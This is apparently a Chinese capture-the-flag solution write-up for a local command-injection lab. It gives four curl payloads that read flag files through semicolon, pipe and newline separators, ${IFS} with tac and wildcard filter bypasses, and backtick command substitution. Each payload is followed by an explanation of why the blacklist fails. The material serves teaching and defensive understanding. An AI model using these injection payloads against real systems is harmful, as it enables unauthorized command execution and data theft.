# 题解：cmd-injection 模块

> ⚠️ 请先把 4 道题全部做出来，再来看这里！

## ci1 直接注入（分号拼接）

```powershell
curl.exe "http://localhost:8082/ci1/?ip=127.0.0.1;cat /first.txt"
```

**讲解**：源码里 `system("ping -c 1 " . $ip)` 把输入直接拼进命令。`;` 是 shell 的顺序分隔符，后面的 `cat /first.txt` 被当成新命令执行，输出直接回显。
**考点本质**：命令注入的第一课——**找到拼接点，用分隔符改变命令结构**。

## ci2 拦分号（分隔符绕过）

```powershell
curl.exe "http://localhost:8082/ci2/?ip=127.0.0.1|cat /second.txt"
# 或换行：?ip=127.0.0.1%0acat /second.txt
```

**讲解**：黑名单 `preg_match('/;/')` 只拦了分号。管道符 `|` 也能把命令串起来（把前面输出喂给后面），`%0a`（URL 编码的换行）也是分隔符。
**考点本质**：**黑名单永远防不全**——它拦什么，你就换一种表达。这也是为什么现代防御都用白名单。

## ci3 拦空格和关键字（IFS / 等价命令 / 通配符）

```powershell
curl.exe "http://localhost:8082/ci3/?ip=127.0.0.1;tac${IFS}/fla*"
```

**讲解**：三个绕过凑在一起：
- `${IFS}`：shell 的分隔符变量，展开后是空格，绕过了"拦空格"（因为过滤检查的是字面空格字符）
- `tac`：cat 的等价命令（倒序输出，单行 flag 不受影响），绕过了"拦 cat"
- `/fla*`：通配符匹配 /flag.txt，绕过了"拦 flag"

**考点本质**：**过滤的是字符串，而 shell 的解析规则远比字符串匹配丰富**——变量展开、通配符、引号拼接都是绕过武器。

## ci4 拦所有分隔符（命令替换）

```powershell
curl.exe "http://localhost:8082/ci4/?msg=%60cat%20/fourth.txt%60"
# 等价写法（$ 被拦时用反引号）：%60cat%20/fourth.txt%60
```

**讲解**：`;`、`|`、`&`、换行全被拦了，但**执行命令不一定要分隔符**。```cmd```（反引号）和 `$(cmd)` 是命令替换：shell 会**先执行里面的命令，把输出拼回原命令**。所以 `echo 你输入的是: `cat /fourth.txt`` 输出里就带上了 flag。

**考点本质**：**无分隔符注入**——你的输入本身就是命令的一部分。命令替换是 shell 的固有特性，任何把输入拼进命令的地方都有这个风险。

## 小结：命令注入三板斧

1. **分隔符**：`;` `&&` `||` `|` `%0a` `&`
2. **绕过**：`${IFS}`（空格）、等价命令/通配符/引号拼接（关键字）、`$()`/反引号（无分隔符）
3. **无回显**：`sleep` 时间盲注、OOB 带外
